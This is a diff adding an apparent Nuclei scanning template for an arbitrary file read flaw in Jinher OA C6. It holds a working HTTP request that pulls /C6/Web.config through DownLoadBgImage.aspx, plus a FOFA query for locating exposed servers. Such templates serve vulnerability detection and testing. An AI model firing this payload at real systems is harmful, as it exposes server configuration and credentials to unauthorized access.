@@ -1,0 +1,41 @@
+id: jinher-oa-c6-DownLoadBgImage-fileread
+info:
+  name: 金和 OA c6 DownLoadBgImage.aspx - fileread
+  author: leadlife
+  severity: high
+  description: https://github.com/wy876/POC/blob/33aeb58103048c9c34340cd4ddef97c9a853f798/%E9%87%91%E5%92%8COA-C6%E6%8E%A5%E5%8F%A3DownLoadBgImage%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  reference: 
+    - https://github.com/wy876/POC/blob/33aeb58103048c9c34340cd4ddef97c9a853f798/%E9%87%91%E5%92%8COA-C6%E6%8E%A5%E5%8F%A3DownLoadBgImage%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    tips: /C6/js/PasswordNew.js
+    fofa-query: body="/jc6/platform/sys/login" || body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || "JC6金和协同管理平台"
+  tags: jinher,fileread,oa
+
+
+http:
+  - raw:
+      - |
+        GET /C6/JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx/?path=/C6/Web.config HTTP/1.1
+        Host: {{Hostname}}
+        accept: */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: myie=false; sl-session=dFmseghQeWZR/amIUs1SMQ==; myie=false
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<?xml"
+          - "configuration"
+          - "Microsoft"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
